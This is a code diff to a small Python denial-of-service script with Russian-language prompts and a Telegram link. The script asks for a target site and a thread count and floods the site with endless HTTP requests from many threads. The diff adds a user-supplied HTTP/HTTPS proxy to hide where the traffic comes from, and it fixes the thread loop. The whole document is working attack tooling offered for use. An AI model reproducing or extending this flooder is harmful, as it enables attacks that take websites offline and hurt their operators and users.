@@ -7,9 +7,12 @@ def clear():
     else:
         os.system('cls')
 
-def dos(site):
+def dos(site, proxy):
   while True:
-    r = requests.get(site)
+    try:
+      r = requests.get(site, proxies={'https':proxy})
+    except:
+      r = requests.get(site, proxies={'http':proxy})
     if str(r.status_code) == '200':
       print(Fore.GREEN+'[+] Пакет отправлен!'+Style.RESET_ALL)
     else:
@@ -24,6 +27,7 @@ TG 2: https://teleg.run/bomba1408
 
 site = str(input('Site: '))
 skok = int(input('Сколько потоков? '))
+proxy = str(input('1 прокси (только http/https): '))
 
-for i in range(1, skok):
-  threading.Thread(target=dos, args=(site,)).start()
+for i in range(0, skok):
+  threading.Thread(target=dos, args=(site, proxy)).start()
